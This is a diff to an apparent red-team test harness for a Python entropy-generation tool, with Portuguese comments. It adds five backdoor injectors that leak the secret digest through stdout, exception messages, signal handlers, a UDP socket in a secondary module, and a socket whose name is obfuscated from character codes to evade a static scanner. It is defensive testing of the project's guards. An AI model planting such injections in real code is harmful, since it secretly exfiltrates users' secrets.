@@ -168,6 +168,110 @@ def _backdoor_10_atexit(source: str) -> str:
     return _inject_after_combine_digest(source, injected)
 
 
+def _backdoor_12_stdout(source: str) -> str:
+    # Fase D (Fase 44): mesmo ataque do 01 (stderr), mas via stdout --
+    # canal DIFERENTE, achado de auditoria: tests/test_cli_generate.py so
+    # capturava a TerminalIO falsa, nao o stdout/stderr REAIS do processo,
+    # entao um backdoor deste tipo escapava do teste mais importante do
+    # projeto do ponto de vista de confidencialidade (corrigido nesta
+    # mesma fase, ver `_run_capturing_real_stdio` em test_cli_generate.py).
+    injected = (
+        "    import sys as _lab_sys\n"
+        f"    _lab_sys.stdout.write('{LAB_MARKER}_12:' + digest.hex() + chr(10))\n"
+        "    _lab_sys.stdout.flush()\n"
+    )
+    return _inject_after_combine_digest(source, injected)
+
+
+def _backdoor_13_exception_message(source: str) -> str:
+    # exfiltra levantando uma excecao cuja MENSAGEM contem o segredo --
+    # se o chamador so logar/exibir `str(exc)` (comportamento comum e
+    # "inocente" ao lidar com erros), o segredo vaza mesmo sem nenhuma
+    # escrita explicita em stdout/stderr/arquivo/rede.
+    injected = (
+        "    import os as _lab_os\n"
+        "    if _lab_os.environ.get('ENTROPYFORGE_LAB_TRIGGER_13') == '1':\n"
+        f"        raise RuntimeError('{LAB_MARKER}_13:' + digest.hex())\n"
+    )
+    return _inject_after_combine_digest(source, injected)
+
+
+def _backdoor_14_secondary_module_report(source: str) -> str:
+    # ESTE backdoor nao mexe em combine.py -- mexe em report.py, um modulo
+    # "irrelevante" (formatacao de relatorio estatistico, nao participa da
+    # combinacao/derivacao de entropia) que roda DEPOIS de guard.activate()
+    # (ao contrario do backdoor 06). Testa se guard.py bloqueia uma
+    # tentativa de rede partindo de QUALQUER modulo do pacote, nao so de
+    # combine.py -- e se um revisor que so olha "os arquivos criticos"
+    # deixaria isto passar.
+    injected = (
+        "\n\n"
+        "def _lab_backdoor_14_leak(face_counts):\n"
+        "    try:\n"
+        "        import socket as _lab_socket\n"
+        "        _s = _lab_socket.socket(_lab_socket.AF_INET, _lab_socket.SOCK_DGRAM)\n"
+        "        _s.sendto(bytes(face_counts), ('127.0.0.1', 9))\n"
+        "    except Exception as _lab_exc:\n"
+        "        import sys as _lab_sys\n"
+        f"        _lab_sys.stderr.write('{LAB_MARKER}_14_BLOCKED:' + repr(_lab_exc) + chr(10))\n"
+        "\n\n"
+        "_ORIGINAL_PUBLIC_REPORT = public_report\n"
+        "\n\n"
+        "def public_report(battery):\n"
+        "    _lab_backdoor_14_leak(battery.face_counts)\n"
+        "    return _ORIGINAL_PUBLIC_REPORT(battery)\n"
+    )
+    return source + injected
+
+
+def _backdoor_15_signal_handler(source: str) -> str:
+    # registra um handler de SIGTERM/SIGINT que exfiltra ao processo ser
+    # interrompido (ex.: usuario aperta Ctrl-C durante a geracao,
+    # cenario realista e ja mencionado como categoria de ameaca em
+    # docs/THREAT_MODEL.md/tests/test_generate_interruption_safety.py).
+    injected = (
+        "    import signal as _lab_signal\n"
+        "    def _lab_handler(_signum, _frame, _captured=digest.hex()):\n"
+        "        import sys as _lab_sys\n"
+        f"        _lab_sys.stderr.write('{LAB_MARKER}_15_SIGNAL:' + _captured + chr(10))\n"
+        "        raise SystemExit(1)\n"
+        "    try:\n"
+        "        _lab_signal.signal(_lab_signal.SIGTERM, _lab_handler)\n"
+        "        _lab_signal.signal(_lab_signal.SIGINT, _lab_handler)\n"
+        "    except (ValueError, OSError):\n"
+        "        pass  # so funciona na thread principal\n"
+    )
+    return _inject_after_combine_digest(source, injected)
+
+
+def _backdoor_11_obfuscated_socket(source: str) -> str:
+    # Fase D, secao 10/41: mesmo ataque do backdoor 03 (socket UDP), mas
+    # construindo o nome do modulo e dos metodos DINAMICAMENTE (nunca a
+    # string literal "socket" aparece no source), para testar o limite
+    # explicito ja documentado de static_scan.py ("ofuscacao leve escapa
+    # da camada AST; a camada textual pode ainda pegar substrings, mas
+    # nao uma concatenacao em tempo de execucao"). O guard.py ainda deve
+    # bloquear a operacao em tempo de execucao (o audit hook intercepta
+    # pelo NOME DO EVENTO real gerado pelo interpretador, "socket.__new__",
+    # que nao depende de como o codigo chamador escreveu o nome do modulo
+    # -- ofuscacao de codigo-fonte nao ofusca o evento de auditoria).
+    injected = (
+        "    try:\n"
+        "        _lab_modname = ''.join(chr(c) for c in (115, 111, 99, 107, 101, 116))\n"
+        "        _lab_mod = __import__(_lab_modname)\n"
+        "        _lab_ctor = getattr(_lab_mod, _lab_modname)\n"
+        "        _lab_af = getattr(_lab_mod, 'AF_INET')\n"
+        "        _lab_sk = getattr(_lab_mod, 'SOCK_DGRAM')\n"
+        "        _s = _lab_ctor(_lab_af, _lab_sk)\n"
+        "        _sendto = getattr(_s, ''.join(chr(c) for c in (115, 101, 110, 100, 116, 111)))\n"
+        "        _sendto(digest, ('127.0.0.1', 9))\n"
+        "    except Exception as _lab_exc:\n"
+        "        import sys as _lab_sys\n"
+        f"        _lab_sys.stderr.write('{LAB_MARKER}_11_BLOCKED:' + repr(_lab_exc) + chr(10))\n"
+    )
+    return _inject_after_combine_digest(source, injected)
+
+
 def _backdoor_06_pre_guard_init(source: str) -> str:
     # ESTE backdoor nao mexe em combine.py -- mexe em __init__.py, que
     # roda ANTES de guard.activate() poder ser chamado (ver docstring do
@@ -196,6 +300,11 @@ BACKDOORS: list[Backdoor] = [
     Backdoor("08", "Condicional a pilha de chamadas", "inspeciona a pilha de chamadas para detectar se esta rodando dentro do selftest", "combine.py", _backdoor_08_callstack_selftest),
     Backdoor("09", "Condicional a variavel de ambiente", "so se comporta soretiro quando uma variavel de ambiente magica esta ausente", "combine.py", _backdoor_09_env_var),
     Backdoor("10", "Exfiltracao via atexit", "registra um handler atexit que escreve a entropia ao sair do processo", "combine.py", _backdoor_10_atexit),
+    Backdoor("11", "Socket ofuscado (nomes construidos em runtime)", "mesmo ataque do 03, mas sem a string literal 'socket' aparecer no source -- testa o limite de static_scan.py contra ofuscacao", "combine.py", _backdoor_11_obfuscated_socket),
+    Backdoor("12", "Exfiltracao via stdout", "gera o resultado correto; escreve a entropia combinada em stdout (canal diferente do 01/stderr)", "combine.py", _backdoor_12_stdout),
+    Backdoor("13", "Exfiltracao via mensagem de excecao", "levanta uma excecao cuja mensagem contem a entropia, condicional a uma variavel de ambiente de laboratorio", "combine.py", _backdoor_13_exception_message),
+    Backdoor("14", "Modulo secundario pos-guard (report.py)", "backdoor em um modulo 'irrelevante' que roda DEPOIS de guard.activate() (ao contrario do 06) -- testa se o guard bloqueia tentativas de rede partindo de qualquer modulo, nao so combine.py", "report.py", _backdoor_14_secondary_module_report),
+    Backdoor("15", "Exfiltracao via handler de sinal", "registra um handler de SIGTERM/SIGINT que exfiltra a entropia ao processo ser interrompido (ex.: Ctrl-C durante generate)", "combine.py", _backdoor_15_signal_handler),
 ]
 
 BACKDOORS_BY_ID = {b.id: b for b in BACKDOORS}
